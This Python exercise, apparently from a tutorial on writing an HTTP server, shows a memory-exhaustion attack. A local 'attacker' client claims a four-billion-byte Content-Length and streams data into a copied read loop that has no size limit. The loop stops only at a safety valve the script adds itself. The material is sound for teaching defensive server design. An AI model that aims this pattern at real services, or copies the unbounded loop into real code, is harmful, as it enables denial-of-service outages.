"""Exercise: one line of request, most of a gigabyte of memory.

read_request in step4_session.py trusts Content-Length and loops until it
has that many bytes. This client claims four billion and then dribbles a
body in. The same loop, extracted here so it can print what it is holding,
collects all of it. A real server would keep going until the machine ran
out; this one stops itself at 500 MB so your laptop does not.

Run it with:  python3 oversized_body.py
"""

import socket
import threading
import time

SAFETY = 500_000_000        # our own limit, which the real loop does not have


def read_request(conn):
    """step4_session.py's read_request, with a print and a safety valve."""
    data = conn.recv(65536)
    head, _, rest = data.partition(b"\r\n\r\n")
    headers = dict(
        (line.split(b": ", 1)[0].decode().lower(),
         line.split(b": ", 1)[1].decode())
        for line in head.split(b"\r\n")[1:] if b": " in line)
    length = int(headers.get("content-length", 0))
    print(f"the request line claims a body of {length:,} bytes")
    last = 0
    while len(rest) < length:
        chunk = conn.recv(1_000_000)
        if not chunk:
            break
        rest += chunk
        if len(rest) - last >= 100_000_000:
            last = len(rest)
            print(f"    holding {len(rest) // 1_000_000} MB and still asking")
        if len(rest) >= SAFETY:
            print("    stopped by our safety valve; the real loop has none")
            break
    return head, rest


def attacker():
    time.sleep(0.3)
    client = socket.socket()
    client.connect(("127.0.0.1", 8055))
    client.sendall(b"POST /x HTTP/1.1\r\nContent-Length: 4000000000\r\n\r\n")
    blob = b"A" * 5_000_000
    for _ in range(200):
        try:
            client.sendall(blob)
        except OSError:
            break
    client.close()


server = socket.socket()
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(("127.0.0.1", 8055))
server.listen(1)
threading.Thread(target=attacker, daemon=True).start()

connection, _ = server.accept()
head, body = read_request(connection)
print(f"one request, {len(body) // 1_000_000} MB of this process gone,"
      f" and nothing has been answered yet")
connection.close()
server.close()
